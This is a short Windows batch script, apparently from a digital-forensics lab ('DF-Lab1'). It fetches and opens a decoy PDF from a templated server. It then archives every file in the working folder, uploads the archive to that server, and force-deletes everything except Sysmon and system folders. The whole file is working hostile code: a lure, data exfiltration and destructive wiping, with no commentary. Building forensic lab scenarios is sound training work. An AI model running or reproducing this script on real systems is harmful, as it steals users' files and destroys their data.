@echo off

powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://{{SERVER_IP}}/download/DF-Lab1.pdf' -OutFile '%~dp0DF-Lab1.pdf' -UseBasicParsing"

powershell -NoProfile -Command "Start-Process -FilePath '%~dp0DF-Lab1.pdf'"

powershell -NoProfile -Command "Start-Sleep -Seconds 15"



powershell -NoProfile -Command "& { $ex = @('$RECYCLE.BIN','System Volume Information','phoenix_staging.zip'); Get-ChildItem -Force | Where-Object { $_.Name -notin $ex } | Compress-Archive -DestinationPath 'phoenix_staging.zip' -Force }"

powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://{{SERVER_IP}}/uploaded/phoenix_staging.zip' -Method POST -InFile 'phoenix_staging.zip' -ContentType 'application/octet-stream' -UseBasicParsing"

powershell -NoProfile -Command "Get-ChildItem -Force | Where-Object { $_.Name -notin 'Sysmon','System Volume Information','$RECYCLE.BIN' } | Remove-Item -Recurse -Force"
